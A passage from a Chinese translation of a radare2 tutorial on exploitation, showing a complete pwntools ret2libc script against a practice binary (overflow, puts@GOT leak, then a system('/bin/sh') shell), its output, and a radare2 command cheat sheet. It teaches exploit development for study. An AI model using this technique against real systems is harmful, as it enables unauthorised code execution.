<pre><code class="python">...

# Offsets
offset_puts = 0x00062710
offset_system = 0x0003c060
offset_exit = 0x0002f1b0
offset_str_bin_sh = 0x167768

...
</code></pre>
<h2 id="获取-shell"><a href="#获取-shell" class="headerlink" title="获取 shell"></a>获取 shell</h2><p>漏洞利用的第二阶段很直接。我们继续使用 140 个字符，然后调用<code>system</code>并将<code>/bin/sh</code>作为参数，最后<code>exit</code>。</p>
<pre><code>+---------------------+
|       Stage 2       |
+---------------------+
| padding (140 bytes) |
| system@libc         |
| exit@libc           |
| /bin/sh address     |
+---------------------+
</code></pre><p>还记得上一次我们返回到了入口点吗？这意味着<code>scanf</code>又在等待我们的输入。现在我们所做的就是把这些调用串联起来传给程序。</p>
<p>这是我们最后的脚本。像我之前所说的，你只需要替换符合你的<em>libc</em>的偏移。</p>
<pre><code class="python">from pwn import *

# Addresses
puts_plt = 0x8048390
puts_got = 0x804a014
entry_point = 0x80483d0

# Offsets
offset_puts = 0x00062710
offset_system = 0x0003c060
offset_exit = 0x0002f1b0
offset_str_bin_sh = 0x167768

# context.log_level = &quot;debug&quot;

def main():

    # open process
    p = process(&quot;./megabeets_0x2&quot;)

    # Stage 1

    # Initial payload
    payload  =  &quot;A&quot;*140
    ropchain =  p32(puts_plt)
    ropchain += p32(entry_point)
    ropchain += p32(puts_got)

    payload = payload + ropchain

    p.clean()
    p.sendline(payload)

    # Take 4 bytes of the output
    leak = p.recv(4)
    leak = u32(leak)
    log.info(&quot;puts is at: 0x%x&quot; % leak)
    p.clean()

    # Calculate libc base
    libc_base = leak - offset_puts
    log.info(&quot;libc base: 0x%x&quot; % libc_base)

    # Stage 2

    # Calculate offsets
    system_addr = libc_base + offset_system
    exit_addr = libc_base  + offset_exit
    binsh_addr = libc_base + offset_str_bin_sh

    log.info(&quot;system is at: 0x%x&quot; % system_addr)
    log.info(&quot;/bin/sh is at: 0x%x&quot; % binsh_addr)
    log.info(&quot;exit is at: 0x%x&quot; % exit_addr)

    # Build 2nd payload
    payload2  =  &quot;A&quot;*140
    ropchain2 =  p32(system_addr)
    ropchain2 += p32(exit_addr)
    # Optional: Fix disallowed character by scanf by using p32(binsh_addr+5)
    #           Then you&#39;ll execute system(&quot;sh&quot;)
    ropchain2 += p32(binsh_addr)

    payload2 = payload2 + ropchain2
    p.sendline(payload2)

    log.success(&quot;Here comes the shell!&quot;)

    p.clean()
    p.interactive()

if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<p>跑这个脚本我们就能成功拿到一个 shell：</p>
<pre><code class="shell">$ python exploit.py
[+] Starting local process ‘./megabeets_0x2’: pid 24410
[*] puts is at: 0xf75db710
[*] libc base: 0xf75ce000
[*] system is at: 0xf760a060
[*] /bin/sh is at: 0xf7735768
[*] exit is at: 0xf75fd1b0
[+] Here comes the shell!
[*] Switching to interactive mode:

$ whoami
beet
$ echo EOF
EOF
</code></pre>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><code>Radare2</code>之旅的第二部分就到此结束了。我们简单地学习了一些<code>radare2</code>中漏洞利用的功能。在下一部分中，我们会学习<code>radare2</code>再脚本编写和恶意软件分析中的功能。</p>
<h1 id="漏洞利用命令对应表"><a href="#漏洞利用命令对应表" class="headerlink" title="漏洞利用命令对应表"></a>漏洞利用命令对应表</h1><p>这是一系列我在本文中提到的命令（还有一些补充）。你可以把它作为一份参考表。</p>
<h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><ul>
<li><code>$ rabin2 -I ./program</code>——二进制信息（和<code>radare2</code>的 shell 中<code>i</code>命令相同）</li>
<li><code>ii [q]</code>——导入表</li>
<li><code>?v sym.imp.func_name</code>——获取<code>func_name@PLT</code>地址</li>
<li><code>?v reloc.func_name</code>——获取<code>func_name@GOT</code>地址</li>
<li><code>ie [q]</code>——获取入口点地址</li>
<li><code>iS</code>——查看区段的各个权限（读/写/执行）</li>
<li><code>i~canary</code>——检查是否开启<code>Canary</code></li>
<li><code>i~pic</code>——检查是否开启<code>PIE</code></li>
<li><code>i~nx</code>——检查是否开启<code>NX</code></li>
</ul>
<h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><ul>
<li><code>dm</code>——查看内存信息</li>
<li><code>dmm</code>——列出模块（内存中的运行库和二进制模块）</li>
<li><code>dmi [addr|libname] [symname]</code>——列出目标库的标志</li>
</ul>
<h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><ul>
<li><code>e search.*</code>——编辑查找配置</li>
<li><code>/?</code>——列出查找的子命令</li>
<li><code>/ string</code>——在内存或程序段查找字符串</li>
<li><code>/R [?]</code>——查找特定的 ROP</li>
<li><code>/R/</code>——ROP 常规搜索</li>
</ul>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><ul>
<li><code>dc</code>——继续执行</li>
<li><code>dcu addr</code>——继续执行到某个地址</li>
<li><code>dcr</code>——继续执行直到<code>ret</code>（单步步过）</li>
<li><code>dbt [?]</code>——在<em>dbg.btdepth</em>和<em>dbg.btalgo</em>的基础上回溯指令</li>
<li><code>doo [args]</code>——重新打开调试并设置参数</li>
<li><code>ds</code>——单步步入</li>
<li><code>dso</code>——单步步过</li>
</ul>
<h2 id="图形模式"><a href="#图形模式" class="headerlink" title="图形模式"></a>图形模式</h2><ul>
<li><code>pdf @ addr</code>——输出当前位移下函数的汇编代码</li>
<li><code>V</code>——可视化模式，使用<code>p</code>/<code>P</code>再两个模式间切换</li>
<li><code>VV</code>——图形模式，在 ascii 图像下分析</li>
<li><code>V!</code>——控制板模式，对漏洞利用非常有用</li>
</ul>
<p>看看<a href="http://radare.today/posts/using-radare2/" target="_blank" rel="noopener">这篇文章</a>，也许有更多的内容能够帮助到你。</p>

            </div>
            <hr>
            <div>
              <p>
                
                
                  <span>
                <i class="iconfont icon-tag"></i>
                    
                      <a class="hover-with-bg" href="/tags/re/">re</a>
                    
                      <a class="hover-with-bg" href="/tags/translation/">translation</a>
                    
                  </span>
                
              </p>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-12 col-md-6">
                    
                      <a href="/2019/03/02/[TODO]Shellcode-Tricks/">
                        <i class="fa fa-chevron-left"></i>
                        <span>Shellcode Tricks</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-12 col-md-6">
                    
                      <a href="/2019/02/21/2019春节-吾爱破解解题领红包活动/">
                        <span>2019春节-吾爱破解解题领红包活动</span>
                        <i class="fa fa-chevron-right"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

              
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="http://blog.b3ale.cn" target="_blank" rel="nofollow noopener"><b>Hard Work Pays Off.</b></a>
    </div>
    
  <div>
    
      <!-- 不蒜子统计PV -->
      
      <span id="busuanzi_container_site_pv" style="display: none">
      总访问量 <span id="busuanzi_value_site_pv"></span> 次
    </span>
    
    
      <!-- 不蒜子统计UV -->
      
      <span id="busuanzi_container_site_uv" style="display: none">
      总访客数 <span id="busuanzi_value_site_uv"></span> 人
    </span>
    
  </div>


    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
<script src="/js/main.js"></script>


  <script src="/js/lazyload.js"></script>



  
  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var toc = $('#toc');
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;
      var tocLimMax = 2 * boardTop + boardCtn.height();

      $(window).scroll(function () {
        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = boardCtn.css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>







  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<!-- Plugins -->



  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "【译】Radare2之旅-Part2：Exploitation&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script src="/js/local-search.js"></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>



  

  
    <!-- MathJax -->
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
          tex2jax: {
              inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
              processEscapes: true,
              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
          }
      });

      MathJax.Hub.Queue(function() {
          var all = MathJax.Hub.getAllJax(), i;
          for(i=0; i < all.length; i += 1) {
              all[i].SourceElement().parentNode.className += ' has-jax';
          }
      });

    </script>

    <script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->

  










</body>
</html>
